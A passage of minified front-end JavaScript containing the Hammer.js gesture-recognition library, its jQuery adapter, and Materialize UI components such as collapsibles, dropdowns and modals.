            var o, r, s = b(e.changedTouches),
                a = [],
                l = this.target;
            if (r = i.filter((function(e) {
                    return v(e.target, l)
                })), t === pe)
                for (o = 0; o < r.length;) n[r[o].identifier] = !0, o++;
            for (o = 0; o < s.length;) n[s[o].identifier] && a.push(s[o]), t & (he | ve) && delete n[s[o].identifier], o++;
            return a.length ? [w(r.concat(a), "identifier", !0), a] : void 0
        }

        function N() {
            C.apply(this, arguments);
            var e = u(this.handler, this);
            this.touch = new L(this.manager, e), this.mouse = new D(this.manager, e)
        }

        function I(e, t) {
            this.manager = e, this.set(t)
        }

        function z(e) {
            this.id = re++, this.manager = null, this.options = l(e || {}, this.defaults), this.options.enable = p(this.options.enable, !0), this.state = Be, this.simultaneous = {}, this.requireFail = []
        }

        function _(e) {
            return e == we ? "down" : e == be ? "up" : e == me ? "left" : e == ye ? "right" : ""
        }

        function W(e, t) {
            var i = t.manager;
            return i ? i.get(e) : e
        }

        function R() {
            z.apply(this, arguments)
        }

        function F() {
            R.apply(this, arguments), this.pX = null, this.pY = null
        }

        function V() {
            R.apply(this, arguments)
        }

        function X() {
            z.apply(this, arguments), this._timer = null, this._input = null
        }

        function B() {
            R.apply(this, arguments)
        }

        function Q() {
            R.apply(this, arguments)
        }

        function Y() {
            z.apply(this, arguments), this.pTime = !1, this.pCenter = !1, this._timer = null, this._input = null, this.count = 0
        }

        function U(e, t) {
            return (t = t || {}).recognizers = p(t.recognizers, U.defaults.preset), new G(e, t)
        }

        function G(e, t) {
            t = t || {}, this.options = l(t, U.defaults), this.options.inputTarget = this.options.inputTarget || e, this.handlers = {}, this.session = {}, this.recognizers = [], this.element = e, this.input = function(e) {
                return new(e.options.inputClass || (ae ? M : le ? L : se ? N : D))(e, T)
            }(this), this.touchAction = new I(this, this.options.touchAction), Z(this, !0), s(t.recognizers, (function(e) {
                var t = this.add(new e[0](e[1]));
                e[2] && t.recognizeWith(e[2]), e[3] && t.requireFailure(e[3])
            }), this)
        }

        function Z(e, t) {
            var i = e.element;
            s(e.options.cssProps, (function(e, n) {
                i.style[x(i.style, n)] = t ? e : ""
            }))
        }

        function J(e, i) {
            var n = t.createEvent("Event");
            n.initEvent(e, !0, !0), n.gesture = i, i.target.dispatchEvent(n)
        }
        var K = ["", "webkit", "moz", "MS", "ms", "o"],
            ee = t.createElement("div"),
            te = "function",
            ie = Math.round,
            ne = Math.abs,
            oe = Date.now,
            re = 1,
            se = "ontouchstart" in e,
            ae = x(e, "PointerEvent") !== n,
            le = se && /mobile|tablet|ip(ad|hone|od)|android/i.test(navigator.userAgent),
            ce = "touch",
            ue = "mouse",
            de = 25,
            pe = 1,
            fe = 2,
            he = 4,
            ve = 8,
            ge = 1,
            me = 2,
            ye = 4,
            be = 8,
            we = 16,
            xe = me | ye,
            ke = be | we,
            Ce = xe | ke,
            Te = ["x", "y"],
            Se = ["clientX", "clientY"];
        C.prototype = {
            handler: function() {},
            init: function() {
                this.evEl && f(this.element, this.evEl, this.domHandler), this.evTarget && f(this.target, this.evTarget, this.domHandler), this.evWin && f(k(this.element), this.evWin, this.domHandler)
            },
            destroy: function() {
                this.evEl && h(this.element, this.evEl, this.domHandler), this.evTarget && h(this.target, this.evTarget, this.domHandler), this.evWin && h(k(this.element), this.evWin, this.domHandler)
            }
        };
        var Ae = {
                mousedown: pe,
                mousemove: fe,
                mouseup: he
            },
            $e = "mousedown",
            Ee = "mousemove mouseup";
        c(D, C, {
            handler: function(e) {
                var t = Ae[e.type];
                t & pe && 0 === e.button && (this.pressed = !0), t & fe && 1 !== e.which && (t = he), this.pressed && this.allow && (t & he && (this.pressed = !1), this.callback(this.manager, t, {
                    pointers: [e],
                    changedPointers: [e],
                    pointerType: ue,
                    srcEvent: e
                }))
            }
        });
        var Pe = {
                pointerdown: pe,
                pointermove: fe,
                pointerup: he,
                pointercancel: ve,
                pointerout: ve
            },
            Oe = {
                2: ce,
                3: "pen",
                4: ue,
                5: "kinect"
            },
            De = "pointerdown",
            Me = "pointermove pointerup pointercancel";
        e.MSPointerEvent && (De = "MSPointerDown", Me = "MSPointerMove MSPointerUp MSPointerCancel"), c(M, C, {
            handler: function(e) {
                var t = this.store,
                    i = !1,
                    n = e.type.toLowerCase().replace("ms", ""),
                    o = Pe[n],
                    r = Oe[e.pointerType] || e.pointerType,
                    s = r == ce,
                    a = y(t, e.pointerId, "pointerId");
                o & pe && (0 === e.button || s) ? 0 > a && (t.push(e), a = t.length - 1) : o & (he | ve) && (i = !0), 0 > a || (t[a] = e, this.callback(this.manager, o, {
                    pointers: t,
                    changedPointers: [e],
                    pointerType: r,
                    srcEvent: e
                }), i && t.splice(a, 1))
            }
        });
        var je = {
                touchstart: pe,
                touchmove: fe,
                touchend: he,
                touchcancel: ve
            },
            qe = "touchstart",
            Le = "touchstart touchmove touchend touchcancel";
        c(j, C, {
            handler: function(e) {
                var t = je[e.type];
                if (t === pe && (this.started = !0), this.started) {
                    var i = q.call(this, e, t);
                    t & (he | ve) && 0 == i[0].length - i[1].length && (this.started = !1), this.callback(this.manager, t, {
                        pointers: i[0],
                        changedPointers: i[1],
                        pointerType: ce,
                        srcEvent: e
                    })
                }
            }
        });
        var He = {
                touchstart: pe,
                touchmove: fe,
                touchend: he,
                touchcancel: ve
            },
            Ne = "touchstart touchmove touchend touchcancel";
        c(L, C, {
            handler: function(e) {
                var t = He[e.type],
                    i = H.call(this, e, t);
                i && this.callback(this.manager, t, {
                    pointers: i[0],
                    changedPointers: i[1],
                    pointerType: ce,
                    srcEvent: e
                })
            }
        }), c(N, C, {
            handler: function(e, t, i) {
                var n = i.pointerType == ce,
                    o = i.pointerType == ue;
                if (n) this.mouse.allow = !1;
                else if (o && !this.mouse.allow) return;
                t & (he | ve) && (this.mouse.allow = !0), this.callback(e, t, i)
            },
            destroy: function() {
                this.touch.destroy(), this.mouse.destroy()
            }
        });
        var Ie = x(ee.style, "touchAction"),
            ze = Ie !== n,
            _e = "compute",
            Re = "manipulation",
            Fe = "none",
            Ve = "pan-x",
            Xe = "pan-y";
        I.prototype = {
            set: function(e) {
                e == _e && (e = this.compute()), ze && (this.manager.element.style[Ie] = e), this.actions = e.toLowerCase().trim()
            },
            update: function() {
                this.set(this.manager.options.touchAction)
            },
            compute: function() {
                var e = [];
                return s(this.manager.recognizers, (function(t) {
                        d(t.options.enable, [t]) && (e = e.concat(t.getTouchAction()))
                    })),
                    function(e) {
                        if (g(e, Fe)) return Fe;
                        var t = g(e, Ve),
                            i = g(e, Xe);
                        return t && i ? Ve + " " + Xe : t || i ? t ? Ve : Xe : g(e, Re) ? Re : "auto"
                    }(e.join(" "))
            },
            preventDefaults: function(e) {
                if (!ze) {
                    var t = e.srcEvent,
                        i = e.offsetDirection;
                    if (this.manager.session.prevented) return void t.preventDefault();
                    var n = this.actions,
                        o = g(n, Fe),
                        r = g(n, Xe),
                        s = g(n, Ve);
                    return o || r && i & xe || s && i & ke ? this.preventSrc(t) : void 0
                }
            },
            preventSrc: function(e) {
                this.manager.session.prevented = !0, e.preventDefault()
            }
        };
        var Be = 1;
        z.prototype = {
            defaults: {},
            set: function(e) {
                return a(this.options, e), this.manager && this.manager.touchAction.update(), this
            },
            recognizeWith: function(e) {
                if (r(e, "recognizeWith", this)) return this;
                var t = this.simultaneous;
                return t[(e = W(e, this)).id] || (t[e.id] = e, e.recognizeWith(this)), this
            },
            dropRecognizeWith: function(e) {
                return r(e, "dropRecognizeWith", this) || (e = W(e, this), delete this.simultaneous[e.id]), this
            },
            requireFailure: function(e) {
                if (r(e, "requireFailure", this)) return this;
                var t = this.requireFail;
                return -1 === y(t, e = W(e, this)) && (t.push(e), e.requireFailure(this)), this
            },
            dropRequireFailure: function(e) {
                if (r(e, "dropRequireFailure", this)) return this;
                e = W(e, this);
                var t = y(this.requireFail, e);
                return t > -1 && this.requireFail.splice(t, 1), this
            },
            hasRequireFailures: function() {
                return this.requireFail.length > 0
            },
            canRecognizeWith: function(e) {
                return !!this.simultaneous[e.id]
            },
            emit: function(e) {
                function t(t) {
                    i.manager.emit(i.options.event + (t ? function(e) {
                        return 16 & e ? "cancel" : 8 & e ? "end" : 4 & e ? "move" : 2 & e ? "start" : ""
                    }(n) : ""), e)
                }
                var i = this,
                    n = this.state;
                8 > n && t(!0), t(), n >= 8 && t(!0)
            },
            tryEmit: function(e) {
                return this.canEmit() ? this.emit(e) : void(this.state = 32)
            },
            canEmit: function() {
                for (var e = 0; e < this.requireFail.length;) {
                    if (!(this.requireFail[e].state & (32 | Be))) return !1;
                    e++
                }
                return !0
            },
            recognize: function(e) {
                var t = a({}, e);
                return d(this.options.enable, [this, t]) ? (56 & this.state && (this.state = Be), this.state = this.process(t), void(30 & this.state && this.tryEmit(t))) : (this.reset(), void(this.state = 32))
            },
            process: function() {},
            getTouchAction: function() {},
            reset: function() {}
        }, c(R, z, {
            defaults: {
                pointers: 1
            },
            attrTest: function(e) {
                var t = this.options.pointers;
                return 0 === t || e.pointers.length === t
            },
            process: function(e) {
                var t = this.state,
                    i = e.eventType,
                    n = 6 & t,
                    o = this.attrTest(e);
                return n && (i & ve || !o) ? 16 | t : n || o ? i & he ? 8 | t : 2 & t ? 4 | t : 2 : 32
            }
        }), c(F, R, {
            defaults: {
                event: "pan",
                threshold: 10,
                pointers: 1,
                direction: Ce
            },
            getTouchAction: function() {
                var e = this.options.direction,
                    t = [];
                return e & xe && t.push(Xe), e & ke && t.push(Ve), t
            },
            directionTest: function(e) {
                var t = this.options,
                    i = !0,
                    n = e.distance,
                    o = e.direction,
                    r = e.deltaX,
                    s = e.deltaY;
                return o & t.direction || (t.direction & xe ? (o = 0 === r ? ge : 0 > r ? me : ye, i = r != this.pX, n = Math.abs(e.deltaX)) : (o = 0 === s ? ge : 0 > s ? be : we, i = s != this.pY, n = Math.abs(e.deltaY))), e.direction = o, i && n > t.threshold && o & t.direction
            },
            attrTest: function(e) {
                return R.prototype.attrTest.call(this, e) && (2 & this.state || !(2 & this.state) && this.directionTest(e))
            },
            emit: function(e) {
                this.pX = e.deltaX, this.pY = e.deltaY;
                var t = _(e.direction);
                t && this.manager.emit(this.options.event + t, e), this._super.emit.call(this, e)
            }
        }), c(V, R, {
            defaults: {
                event: "pinch",
                threshold: 0,
                pointers: 2
            },
            getTouchAction: function() {
                return [Fe]
            },
            attrTest: function(e) {
                return this._super.attrTest.call(this, e) && (Math.abs(e.scale - 1) > this.options.threshold || 2 & this.state)
            },
            emit: function(e) {
                if (this._super.emit.call(this, e), 1 !== e.scale) {
                    var t = e.scale < 1 ? "in" : "out";
                    this.manager.emit(this.options.event + t, e)
                }
            }
        }), c(X, z, {
            defaults: {
                event: "press",
                pointers: 1,
                time: 500,
                threshold: 5
            },
            getTouchAction: function() {
                return ["auto"]
            },
            process: function(e) {
                var t = this.options,
                    i = e.pointers.length === t.pointers,
                    n = e.distance < t.threshold,
                    r = e.deltaTime > t.time;
                if (this._input = e, !n || !i || e.eventType & (he | ve) && !r) this.reset();
                else if (e.eventType & pe) this.reset(), this._timer = o((function() {
                    this.state = 8, this.tryEmit()
                }), t.time, this);
                else if (e.eventType & he) return 8;
                return 32
            },
            reset: function() {
                clearTimeout(this._timer)
            },
            emit: function(e) {
                8 === this.state && (e && e.eventType & he ? this.manager.emit(this.options.event + "up", e) : (this._input.timeStamp = oe(), this.manager.emit(this.options.event, this._input)))
            }
        }), c(B, R, {
            defaults: {
                event: "rotate",
                threshold: 0,
                pointers: 2
            },
            getTouchAction: function() {
                return [Fe]
            },
            attrTest: function(e) {
                return this._super.attrTest.call(this, e) && (Math.abs(e.rotation) > this.options.threshold || 2 & this.state)
            }
        }), c(Q, R, {
            defaults: {
                event: "swipe",
                threshold: 10,
                velocity: .65,
                direction: xe | ke,
                pointers: 1
            },
            getTouchAction: function() {
                return F.prototype.getTouchAction.call(this)
            },
            attrTest: function(e) {
                var t, i = this.options.direction;
                return i & (xe | ke) ? t = e.velocity : i & xe ? t = e.velocityX : i & ke && (t = e.velocityY), this._super.attrTest.call(this, e) && i & e.direction && e.distance > this.options.threshold && ne(t) > this.options.velocity && e.eventType & he
            },
            emit: function(e) {
                var t = _(e.direction);
                t && this.manager.emit(this.options.event + t, e), this.manager.emit(this.options.event, e)
            }
        }), c(Y, z, {
            defaults: {
                event: "tap",
                pointers: 1,
                taps: 1,
                interval: 300,
                time: 250,
                threshold: 2,
                posThreshold: 10
            },
            getTouchAction: function() {
                return [Re]
            },
            process: function(e) {
                var t = this.options,
                    i = e.pointers.length === t.pointers,
                    n = e.distance < t.threshold,
                    r = e.deltaTime < t.time;
                if (this.reset(), e.eventType & pe && 0 === this.count) return this.failTimeout();
                if (n && r && i) {
                    if (e.eventType != he) return this.failTimeout();
                    var s = !this.pTime || e.timeStamp - this.pTime < t.interval,
                        a = !this.pCenter || P(this.pCenter, e.center) < t.posThreshold;
                    if (this.pTime = e.timeStamp, this.pCenter = e.center, a && s ? this.count += 1 : this.count = 1, this._input = e, 0 == this.count % t.taps) return this.hasRequireFailures() ? (this._timer = o((function() {
                        this.state = 8, this.tryEmit()
                    }), t.interval, this), 2) : 8
                }
                return 32
            },
            failTimeout: function() {
                return this._timer = o((function() {
                    this.state = 32
                }), this.options.interval, this), 32
            },
            reset: function() {
                clearTimeout(this._timer)
            },
            emit: function() {
                8 == this.state && (this._input.tapCount = this.count, this.manager.emit(this.options.event, this._input))
            }
        }), U.VERSION = "2.0.4", U.defaults = {
            domEvents: !1,
            touchAction: _e,
            enable: !0,
            inputTarget: null,
            inputClass: null,
            preset: [
                [B, {
                    enable: !1
                }],
                [V, {
                        enable: !1
                    },
                    ["rotate"]
                ],
                [Q, {
                    direction: xe
                }],
                [F, {
                        direction: xe
                    },
                    ["swipe"]
                ],
                [Y],
                [Y, {
                        event: "doubletap",
                        taps: 2
                    },
                    ["tap"]
                ],
                [X]
            ],
            cssProps: {
                userSelect: "default",
                touchSelect: "none",
                touchCallout: "none",
                contentZooming: "none",
                userDrag: "none",
                tapHighlightColor: "rgba(0,0,0,0)"
            }
        }, G.prototype = {
            set: function(e) {
                return a(this.options, e), e.touchAction && this.touchAction.update(), e.inputTarget && (this.input.destroy(), this.input.target = e.inputTarget, this.input.init()), this
            },
            stop: function(e) {
                this.session.stopped = e ? 2 : 1
            },
            recognize: function(e) {
                var t = this.session;
                if (!t.stopped) {
                    this.touchAction.preventDefaults(e);
                    var i, n = this.recognizers,
                        o = t.curRecognizer;
                    (!o || o && 8 & o.state) && (o = t.curRecognizer = null);
                    for (var r = 0; r < n.length;) i = n[r], 2 === t.stopped || o && i != o && !i.canRecognizeWith(o) ? i.reset() : i.recognize(e), !o && 14 & i.state && (o = t.curRecognizer = i), r++
                }
            },
            get: function(e) {
                if (e instanceof z) return e;
                for (var t = this.recognizers, i = 0; i < t.length; i++)
                    if (t[i].options.event == e) return t[i];
                return null
            },
            add: function(e) {
                if (r(e, "add", this)) return this;
                var t = this.get(e.options.event);
                return t && this.remove(t), this.recognizers.push(e), e.manager = this, this.touchAction.update(), e
            },
            remove: function(e) {
                if (r(e, "remove", this)) return this;
                var t = this.recognizers;
                return e = this.get(e), t.splice(y(t, e), 1), this.touchAction.update(), this
            },
            on: function(e, t) {
                var i = this.handlers;
                return s(m(e), (function(e) {
                    i[e] = i[e] || [], i[e].push(t)
                })), this
            },
            off: function(e, t) {
                var i = this.handlers;
                return s(m(e), (function(e) {
                    t ? i[e].splice(y(i[e], t), 1) : delete i[e]
                })), this
            },
            emit: function(e, t) {
                this.options.domEvents && J(e, t);
                var i = this.handlers[e] && this.handlers[e].slice();
                if (i && i.length) {
                    t.type = e, t.preventDefault = function() {
                        t.srcEvent.preventDefault()
                    };
                    for (var n = 0; n < i.length;) i[n](t), n++
                }
            },
            destroy: function() {
                this.element && Z(this, !1), this.handlers = {}, this.session = {}, this.input.destroy(), this.element = null
            }
        }, a(U, {
            INPUT_START: pe,
            INPUT_MOVE: fe,
            INPUT_END: he,
            INPUT_CANCEL: ve,
            STATE_POSSIBLE: Be,
            STATE_BEGAN: 2,
            STATE_CHANGED: 4,
            STATE_ENDED: 8,
            STATE_RECOGNIZED: 8,
            STATE_CANCELLED: 16,
            STATE_FAILED: 32,
            DIRECTION_NONE: ge,
            DIRECTION_LEFT: me,
            DIRECTION_RIGHT: ye,
            DIRECTION_UP: be,
            DIRECTION_DOWN: we,
            DIRECTION_HORIZONTAL: xe,
            DIRECTION_VERTICAL: ke,
            DIRECTION_ALL: Ce,
            Manager: G,
            Input: C,
            TouchAction: I,
            TouchInput: L,
            MouseInput: D,
            PointerEventInput: M,
            TouchMouseInput: N,
            SingleTouchInput: j,
            Recognizer: z,
            AttrRecognizer: R,
            Tap: Y,
            Pan: F,
            Swipe: Q,
            Pinch: V,
            Rotate: B,
            Press: X,
            on: f,
            off: h,
            each: s,
            merge: l,
            extend: a,
            inherit: c,
            bindFn: u,
            prefixed: x
        }), typeof define == te && define.amd ? define((function() {
            return U
        })) : "undefined" != typeof module && module.exports ? module.exports = U : e.Hammer = U
    }(window, document),
    function(e) {
        "function" == typeof define && define.amd ? define(["jquery", "hammerjs"], e) : "object" == typeof exports ? e(require("jquery"), require("hammerjs")) : e(jQuery, Hammer)
    }((function(e, t) {
        var i;
        e.fn.hammer = function(i) {
            return this.each((function() {
                ! function(i, n) {
                    var o = e(i);
                    o.data("hammer") || o.data("hammer", new t(o[0], n))
                }(this, i)
            }))
        }, t.Manager.prototype.emit = (i = t.Manager.prototype.emit, function(t, n) {
            i.call(this, t, n), e(this.element).trigger({
                type: t,
                gesture: n
            })
        })
    })),
    function(e) {
        e.Package ? Materialize = {} : e.Materialize = {}
    }(window), "undefined" == typeof exports || exports.nodeType || ("undefined" != typeof module && !module.nodeType && module.exports && (exports = module.exports = Materialize), exports.default = Materialize),
    function(e) {
        for (var t = 0, i = ["webkit", "moz"], n = e.requestAnimationFrame, o = e.cancelAnimationFrame, r = i.length; --r >= 0 && !n;) n = e[i[r] + "RequestAnimationFrame"], o = e[i[r] + "CancelRequestAnimationFrame"];
        n && o || (n = function(e) {
            var i = +Date.now(),
                n = Math.max(t + 16, i);
            return setTimeout((function() {
                e(t = n)
            }), n - i)
        }, o = clearTimeout), e.requestAnimationFrame = n, e.cancelAnimationFrame = o
    }(window), Materialize.objectSelectorString = function(e) {
        return ((e.prop("tagName") || "") + (e.attr("id") || "") + (e.attr("class") || "")).replace(/\s/g, "")
    }, Materialize.guid = function() {
        function e() {
            return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
        }
        return function() {
            return e() + e() + "-" + e() + "-" + e() + "-" + e() + "-" + e() + e() + e()
        }
    }(), Materialize.escapeHash = function(e) {
        return e.replace(/(:|\.|\[|\]|,|=)/g, "\\$1")
    }, Materialize.elementOrParentIsFixed = function(e) {
        var t = $(e),
            i = t.add(t.parents()),
            n = !1;
        return i.each((function() {
            if ("fixed" === $(this).css("position")) return n = !0, !1
        })), n
    };
var Vel, getTime = Date.now || function() {
    return (new Date).getTime()
};
Materialize.throttle = function(e, t, i) {
        var n, o, r, s = null,
            a = 0;
        i || (i = {});
        var l = function() {
            a = !1 === i.leading ? 0 : getTime(), s = null, r = e.apply(n, o), n = o = null
        };
        return function() {
            var c = getTime();
            a || !1 !== i.leading || (a = c);
            var u = t - (c - a);
            return n = this, o = arguments, u <= 0 ? (clearTimeout(s), s = null, a = c, r = e.apply(n, o), n = o = null) : s || !1 === i.trailing || (s = setTimeout(l, u)), r
        }
    }, Vel = jQuery ? jQuery.Velocity : $ ? $.Velocity : Velocity, Materialize.Vel = Vel || Velocity,
    function(e) {
        e.fn.collapsible = function(t, i) {
            var o = t;
            return t = e.extend({
                accordion: void 0,
                onOpen: void 0,
                onClose: void 0
            }, t), this.each((function() {
                var n = e(this),
                    r = e(this).find("> li > .collapsible-header"),
                    s = n.data("collapsible");

                function a(i, o) {
                    o || i.toggleClass("active"), t.accordion || "accordion" === s || void 0 === s ? function(t) {
                        r = n.find("> li > .collapsible-header"), t.hasClass("active") ? t.parent().addClass("active") : t.parent().removeClass("active"), t.parent().hasClass("active") ? t.siblings(".collapsible-body").stop(!0, !1).slideDown({
                            duration: 350,
                            easing: "easeOutQuart",
                            queue: !1,
                            complete: function() {
                                e(this).css("height", "")
                            }
                        }) : t.siblings(".collapsible-body").stop(!0, !1).slideUp({
                            duration: 350,
                            easing: "easeOutQuart",
                            queue: !1,
                            complete: function() {
                                e(this).css("height", "")
                            }
                        }), r.not(t).removeClass("active").parent().removeClass("active"), r.not(t).parent().children(".collapsible-body").stop(!0, !1).each((function() {
                            e(this).is(":visible") && e(this).slideUp({
                                duration: 350,
                                easing: "easeOutQuart",
                                queue: !1,
                                complete: function() {
                                    e(this).css("height", ""), l(e(this).siblings(".collapsible-header"))
                                }
                            })
                        }))
                    }(i) : function(t) {
                        t.hasClass("active") ? t.parent().addClass("active") : t.parent().removeClass("active"), t.parent().hasClass("active") ? t.siblings(".collapsible-body").stop(!0, !1).slideDown({
                            duration: 350,
                            easing: "easeOutQuart",
                            queue: !1,
                            complete: function() {
                                e(this).css("height", "")
                            }
                        }) : t.siblings(".collapsible-body").stop(!0, !1).slideUp({
                            duration: 350,
                            easing: "easeOutQuart",
                            queue: !1,
                            complete: function() {
                                e(this).css("height", "")
                            }
                        })
                    }(i), l(i)
                }

                function l(e) {
                    e.hasClass("active") ? "function" == typeof t.onOpen && t.onOpen.call(this, e.parent()) : "function" == typeof t.onClose && t.onClose.call(this, e.parent())
                }

                function c(e) {
                    return e.closest("li > .collapsible-header")
                }

                function u() {
                    n.off("click.collapse", "> li > .collapsible-header")
                }
                if ("destroy" !== o)
                    if (i >= 0 && i < r.length) {
                        var d = r.eq(i);
                        d.length && ("open" === o || "close" === o && d.hasClass("active")) && a(d)
                    } else u(), n.on("click.collapse", "> li > .collapsible-header", (function(t) {
                        var i = e(t.target);
                        c(i).length > 0 && (i = c(i)), a(i)
                    })), t.accordion || "accordion" === s || void 0 === s ? a(r.filter(".active").first(), !0) : r.filter(".active").each((function() {
                        a(e(this), !0)
                    }));
                else u()
            }))
        }, e(document).ready((function() {
            e(".collapsible").collapsible()
        }))
    }(jQuery),
    function(e) {
        e.fn.scrollTo = function(t) {
            return e(this).scrollTop(e(this).scrollTop() - e(this).offset().top + e(t).offset().top), this
        }, e.fn.dropdown = function(t) {
            var i = {
                inDuration: 300,
                outDuration: 225,
                constrainWidth: !0,
                hover: !1,
                gutter: 0,
                belowOrigin: !1,
                alignment: "left",
                stopPropagation: !1
            };
            return "open" === t ? (this.each((function() {
                e(this).trigger("open")
            })), !1) : "close" === t ? (this.each((function() {
                e(this).trigger("close")
            })), !1) : void this.each((function() {
                var n = e(this),
                    o = e.extend({}, i, t),
                    r = !1,
                    s = e("#" + n.attr("data-activates"));

                function a() {
                    void 0 !== n.data("induration") && (o.inDuration = n.data("induration")), void 0 !== n.data("outduration") && (o.outDuration = n.data("outduration")), void 0 !== n.data("constrainwidth") && (o.constrainWidth = n.data("constrainwidth")), void 0 !== n.data("hover") && (o.hover = n.data("hover")), void 0 !== n.data("gutter") && (o.gutter = n.data("gutter")), void 0 !== n.data("beloworigin") && (o.belowOrigin = n.data("beloworigin")), void 0 !== n.data("alignment") && (o.alignment = n.data("alignment")), void 0 !== n.data("stoppropagation") && (o.stopPropagation = n.data("stoppropagation"))
                }

                function l(t) {
                    "focus" === t && (r = !0), a(), s.addClass("active"), n.addClass("active");
                    var i = n[0].getBoundingClientRect().width;
                    !0 === o.constrainWidth ? s.css("width", i) : s.css("white-space", "nowrap");
                    var l = window.innerHeight,
                        u = n.innerHeight(),
                        d = n.offset().left,
                        p = n.offset().top - e(window).scrollTop(),
                        f = o.alignment,
                        h = 0,
                        v = 0,
                        g = 0;
                    !0 === o.belowOrigin && (g = u);
                    var m = 0,
                        y = 0,
                        b = n.parent();
                    if (b.is("body") || (b[0].scrollHeight > b[0].clientHeight && (m = b[0].scrollTop), b[0].scrollWidth > b[0].clientWidth && (y = b[0].scrollLeft)), d + s.innerWidth() > e(window).width() ? f = "right" : d - s.innerWidth() + n.innerWidth() < 0 && (f = "left"), p + s.innerHeight() > l)
                        if (p + u - s.innerHeight() < 0) {
                            var w = l - p - g;
                            s.css("max-height", w)
                        } else g || (g += u), g -= s.innerHeight();
                    "left" === f ? (h = o.gutter, v = n.position().left + h) : "right" === f && (s.stop(!0, !0).css({
                        opacity: 0,
                        left: 0
                    }), v = n.position().left + i - s.width() + (h = -o.gutter)), s.css({
                        position: "absolute",
                        top: n.position().top + g + m,
                        left: v + y
                    }), s.slideDown({
                        queue: !1,
                        duration: o.inDuration,
                        easing: "easeOutCubic",
                        complete: function() {
                            e(this).css("height", "")
                        }
                    }).animate({
                        opacity: 1
                    }, {
                        queue: !1,
                        duration: o.inDuration,
                        easing: "easeOutSine"
                    }), setTimeout((function() {
                        e(document).on("click." + s.attr("id"), (function(t) {
                            c(), e(document).off("click." + s.attr("id"))
                        }))
                    }), 0)
                }

                function c() {
                    r = !1, s.fadeOut(o.outDuration), s.removeClass("active"), n.removeClass("active"), e(document).off("click." + s.attr("id")), setTimeout((function() {
                        s.css("max-height", "")
                    }), o.outDuration)
                }
                if (a(), n.after(s), o.hover) {
                    var u = !1;
                    n.off("click." + n.attr("id")), n.on("mouseenter", (function(e) {
                        !1 === u && (l(), u = !0)
                    })), n.on("mouseleave", (function(t) {
                        var i = t.toElement || t.relatedTarget;
                        e(i).closest(".dropdown-content").is(s) || (s.stop(!0, !0), c(), u = !1)
                    })), s.on("mouseleave", (function(t) {
                        var i = t.toElement || t.relatedTarget;
                        e(i).closest(".dropdown-button").is(n) || (s.stop(!0, !0), c(), u = !1)
                    }))
                } else n.off("click." + n.attr("id")), n.on("click." + n.attr("id"), (function(t) {
                    r || (n[0] != t.currentTarget || n.hasClass("active") || 0 !== e(t.target).closest(".dropdown-content").length ? n.hasClass("active") && (c(), e(document).off("click." + s.attr("id"))) : (t.preventDefault(), o.stopPropagation && t.stopPropagation(), l("click")))
                }));
                n.on("open", (function(e, t) {
                    l(t)
                })), n.on("close", c)
            }))
        }, e(document).ready((function() {
            e(".dropdown-button").dropdown()
        }))
    }(jQuery),
    function(e, t) {
        "use strict";
        var i = {
                opacity: .5,
                inDuration: 250,
                outDuration: 250,
                ready: void 0,
                complete: void 0,
                dismissible: !0,
                startingTop: "4%",
                endingTop: "10%"
            },
            n = function() {
                function n(t, i) {
                    _classCallCheck(this, n), t[0].M_Modal && t[0].M_Modal.destroy(), this.$el = t, this.options = e.extend({}, n.defaults, i), this.isOpen = !1, this.$el[0].M_Modal = this, this.id = t.attr("id"), this.openingTrigger = void 0, this.$overlay = e('<div class="modal-overlay"></div>'), n._increment++, n._count++, this.$overlay[0].style.zIndex = 1e3 + 2 * n._increment, this.$el[0].style.zIndex = 1e3 + 2 * n._increment + 1, this.setupEventHandlers()
                }
                return _createClass(n, [{
                    key: "getInstance",
                    value: function() {
                        return this
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        this.removeEventHandlers(), this.$el[0].removeAttribute("style"), this.$overlay[0].parentNode && this.$overlay[0].parentNode.removeChild(this.$overlay[0]), this.$el[0].M_Modal = void 0, n._count--
                    }
                }, {
                    key: "setupEventHandlers",
                    value: function() {
                        this.handleOverlayClickBound = this.handleOverlayClick.bind(this), this.handleModalCloseClickBound = this.handleModalCloseClick.bind(this), 1 === n._count && document.body.addEventListener("click", this.handleTriggerClick), this.$overlay[0].addEventListener("click", this.handleOverlayClickBound), this.$el[0].addEventListener("click", this.handleModalCloseClickBound)
                    }
                }, {
                    key: "removeEventHandlers",
                    value: function() {
                        0 === n._count && document.body.removeEventListener("click", this.handleTriggerClick), this.$overlay[0].removeEventListener("click", this.handleOverlayClickBound), this.$el[0].removeEventListener("click", this.handleModalCloseClickBound)
                    }
                }, {
                    key: "handleTriggerClick",
                    value: function(t) {
                        var i = e(t.target).closest(".modal-trigger");
                        if (t.target && i.length) {
                            var n = i[0].getAttribute("href");
                            n = n ? n.slice(1) : i[0].getAttribute("data-target");
                            var o = document.getElementById(n).M_Modal;
                            o && o.open(i), t.preventDefault()
                        }
                    }
                }, {
                    key: "handleOverlayClick",
                    value: function() {
                        this.options.dismissible && this.close()
                    }
                }, {
                    key: "handleModalCloseClick",
                    value: function(t) {
                        var i = e(t.target).closest(".modal-close");
                        t.target && i.length && this.close()
                    }
                }, {
                    key: "handleKeydown",
                    value: function(e) {
                        27 === e.keyCode && this.options.dismissible && this.close()
                    }
                }, {
                    key: "animateIn",
                    value: function() {
                        var i = this;
                        e.extend(this.$el[0].style, {
                            display: "block",
                            opacity: 0
                        }), e.extend(this.$overlay[0].style, {
                            display: "block",
                            opacity: 0
                        }), t(this.$overlay[0], {
                            opacity: this.options.opacity
                        }, {
                            duration: this.options.inDuration,
                            queue: !1,
                            ease: "easeOutCubic"
                        });
                        var n = {
                            duration: this.options.inDuration,
                            queue: !1,
                            ease: "easeOutCubic",
                            complete: function() {
                                "function" == typeof i.options.ready && i.options.ready.call(i, i.$el, i.openingTrigger)
                            }
                        };
                        this.$el[0].classList.contains("bottom-sheet") ? t(this.$el[0], {
                            bottom: 0,
                            opacity: 1
                        }, n) : (t.hook(this.$el[0], "scaleX", .7), this.$el[0].style.top = this.options.startingTop, t(this.$el[0], {
                            top: this.options.endingTop,
                            opacity: 1,
                            scaleX: 1
                        }, n))
                    }
                }, {
                    key: "animateOut",
                    value: function() {
                        var e = this;
                        t(this.$overlay[0], {
                            opacity: 0
                        }, {
                            duration: this.options.outDuration,
                            queue: !1,
                            ease: "easeOutQuart"
                        });
                        var i = {
                            duration: this.options.outDuration,
                            queue: !1,
                            ease: "easeOutCubic",
                            complete: function() {
